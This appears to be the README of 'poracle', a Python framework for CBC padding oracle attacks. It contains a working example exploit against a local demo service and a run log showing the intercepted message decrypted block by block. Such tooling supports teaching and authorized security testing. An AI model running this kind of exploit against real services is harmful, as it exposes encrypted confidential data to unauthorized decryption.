# Padding Oracle Attack Framework

`poracle` is a framework for convenient attacks in CBC-padding-oracles using PKCS#7. [There is a great paper](http://dl.acm.org/citation.cfm?id=1925004.1925008) about that topic.

All you have to do in order to break padding oracles using poracle is to define the interface. There are two functions to do that:
* a function that returns the ciphertext that should be considered
* a function that reveals the occurence of a padding error for a given ciphertext

## Interface

The decrypter can be used with:

- `Decrypter(blocksize, interface, verbose=False)`
- `Decrypter.run(remove_pad=True)`

The interface of the oracle must look like:

```python3
class Interface:
    def oracle(self, ciphertext):
        """ This function expects a ciphertext and returns true if there is
        no padding error and false otherwise.

        Args:
            ciphertext (bytes): the ciphertext that should be checked
        """

        raise NotImplementedError

    def intercept(self):
        """ This function should serve a ciphertext by returning it as
        bytes-object. If you know the initialization vector you should use
        it as prefix of the returned ciphertext in order to decrypt the whole
        message (of course except the IV).
        """

        raise NotImplementedError

```


## Example

There is an exemplary implementation of a backend server that is vulnerable against a padding oracle attack.
An exemplary exploit to break an intercepted message using poracle can be seen in the [example folder](https://github.com/ppmx/poracle/tree/master/example).

An exploit with poracle might look like:

```python3
#!/usr/bin/env python3

import base64
import requests

import poracle

class thisInterface(poracle.Interface):
    def oracle(self, ciphertext):
        ctx = base64.urlsafe_b64encode(ciphertext).decode()
        url = "http://127.0.0.1:8080/search?data={0}".format(ctx)
        r = requests.get(url)
        return "no results found" in r.text

    def intercept(self):
        leak = "/search?data=ODE3MzY0ODI5MTgyNjQwMZf5bBNoKx0M2X3LN1di9W9YwrrC935vOcf0Tb2E7YilFQA8UsJdzphd0Yb0h3DRTP5TBXYPpYArrD3qbad2iPU="
        return base64.urlsafe_b64decode(leak[len("/search?data="):])

def main():
    print("[+] starting oracle attack")
    plaintext = poracle.Decrypter(16, thisInterface(), True).run()
    print("[+] decrypted message:", plaintext.decode())

if __name__ == "__main__":
    main()

```

An example run of that code:

```
$ cd example/
$ go run service.go &
$ python3 exploit.py
[+] starting oracle attack
[+] revealed block: b' nothing.\x07\x07\x07\x07\x07\x07\x07'
[+] revealed block: b'realize you know nothing.\x07\x07\x07\x07\x07\x07\x07'
[+] revealed block: b'w, the more you realize you know nothing.\x07\x07\x07\x07\x07\x07\x07'
[+] revealed block: b'The more you know, the more you realize you know nothing.\x07\x07\x07\x07\x07\x07\x07'

[+] decrypted message: The more you know, the more you realize you know nothing.
python3 exploit.py  7.57s user 0.48s system 92% cpu 8.696 total
```

